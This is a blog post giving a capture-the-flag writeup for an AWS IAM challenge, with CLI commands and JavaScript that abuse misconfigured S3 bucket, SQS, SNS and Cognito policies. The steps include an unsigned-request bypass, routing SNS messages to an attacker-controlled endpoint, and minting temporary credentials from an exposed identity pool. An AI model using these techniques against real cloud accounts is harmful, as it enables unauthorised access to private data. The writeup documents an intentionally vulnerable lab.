---
layout: post
title:  the big iam challenge CTF writeup
tags: [tech,ctf,iam]
---

the big iam challenge CTF writeup.  

challenge : https://thebigiamchallenge.com/


## challenge 1

```
aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
```

```
aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/
```

## challenge 2

```
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2

```
you can get the flag by accessing the URL in the response.

## challenge 3
subscribe with a url where you can read the post log

```
aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https  --notification-endpoint https://YOUR_HOST/a?aa@tbic.wiz.io
```
after sending the subscribe request, request the confirm url in the post body. After that, you will get another post request. You can get the flag in the request body.

## challenge 4
参考writeup，需要使用--no-sign-request
```
aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request

aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/ --no-sign-request && cat /tmp/flag-as-admin.txt

```

## challenge 5
参考writeup，identity pool 在网页代码中，就是那张图片的生成代码
```

  AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});
  // Set the region
  AWS.config.update({region: 'us-east-1'});

  $(document).ready(function() {
    var s3 = new AWS.S3();
    params = {
      Bucket: 'wiz-privatefiles',
      Key: 'cognito1.png',
      Expires: 60 * 60
    }

    signedUrl = s3.getSignedUrl('getObject', params, function (err, url) {
      $('#signedImg').attr('src', url);
    });
});
```
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```


```
const bucketName = 'wiz-privatefiles'
const params = {
  Bucket: bucketName,
  Delimiter: '/'
};
s3.listObjects(params, function(err, data) {
  if (err) {
    console.log("Error", err);
  } else {
    console.log("Success", data.CommonPrefixes); // 这将列出所有以 '/' 分隔的前缀，模拟文件夹结构
    console.log("Objects", data.Contents); // 这将列出没有分隔符的对象
  }
});

```
cors报错，将请求转换为curl，命令行执行

```
var s3 = new AWS.S3();
    params2 = {
      Bucket: 'wiz-privatefiles',
      Key: 'flag1.txt',
      Expires: 60 * 60
    }

    signedUrl = s3.getSignedUrl('getObject', params2, function (err, url) {
      $('#signedImg').attr('src', url);
    });
```
访问图片URL即可获得flag.

## challenge 6
Now try it with the authenticated role: arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

```
aws cognito-identity   get-id  --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b

{
    "IdentityId": "us-east-1:157d6171-eec7-cff5-cc89-3c43cbb5994d"
}


aws cognito-identity  get-open-id-token --identity-id us-east-1:157d6171-eec7-cff5-cc89-3c43cbb5994d


{
    "IdentityId": "us-east-1:157d6171-ee10-c5e8-e736-6c238566ac31",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTEtNiIsInR5cCI6Ikp_REDACTED_ArpMZCn9OK_wWftEBe-4MkyLrOVenoZsXU6uREMIwGGoBJtppey1en4v4zbxwew"
}

// 中间一直错误，发现复制出来的token有一些多余的换行符，需要手工删掉

aws sts assume-role-with-web-identity \
    --duration-seconds 3600 \
    --role-session-name "Cognito_s3accessAuth_Role" \
    --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role \
    --web-identity-token "eyJraWQiOiJ1cy1lYXN0L_REDACTED_XZYH0Cabnx9FYZc7psT3bMBkcIJBHO9AvPJAmQnW3lJ0Ul8U-NfmaNAgVpcMnb6x4DHjzE0QlO9SOVF2xO2plawRboqbwOTRrCEHsxVsF_sAy9AkZ97b5hHVFQAj9MsUHvoDEn1IYm0Y99GmQqd8d5JiMic6miCk7sCvcDu7lKFMBAzGN-_yVN8oZR6yHtbxdJt7nHAu79Ctg"


{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBO_REDACTED",
        "SecretAccessKey": "etKXk9sR0OKWh8gD_REDACTED",
        "SessionToken": "FwoGZXIvYXdzEG4aDA6rzFfKu2jQhB9cICKxAs1RvJ+CFR6bpFoZHyuOKdU1E/_REDACTED_FNDfmQC1RfumUCORAyKVAOke4lskh4X54rKSR8gXMGRdF",
        "Expiration": "2024-07-30T13:14:45Z"
    },
    "SubjectFromWebIdentityToken": "us-east-1:157d6171-eec7-cff5-cc89-3c43cbb5994d",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:Cognito_s3accessAuth_Role",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/Cognito_s3accessAuth_Role"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}


export AWS_ACCESS_KEY_ID=ASIARK7L_REDACTED && export AWS_SECRET_ACCESS_KEY="etKXk9sR0OK_REDACTED" && export AWS_SESSION_TOKEN="FwoGZXIvYXdzEG4aDA6rzFfKu2jQhB9cICKxAs1RvJ+CFR6bpFoZHyuOKdU_REDACTED" && aws sts get-caller-identity


export AWS_ACCESS_KEY_ID=ASIARK7L_REDACTED && export AWS_SECRET_ACCESS_KEY="etKXk9sR0OK_REDACTED" && export AWS_SESSION_TOKEN="FwoGZXIvYXdzEG4aDA6rzFfKu2jQhB9cICKxAs1RvJ+CFR6bpFoZHyuOKdU_REDACTED" && aws s3 ls

export AWS_ACCESS_KEY_ID=ASIARK7L_REDACTED && export AWS_SECRET_ACCESS_KEY="etKXk9sR0OK_REDACTED" && export AWS_SESSION_TOKEN="FwoGZXIvYXdzEG4aDA6rzFfKu2jQhB9cICKxAs1RvJ+CFR6bpFoZHyuOKdU_REDACTED" && aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt /tmp/ff.txt && cat /tmp/ff.txt

```


https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/authentication-flow.html
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html
https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/authentication-flow.html

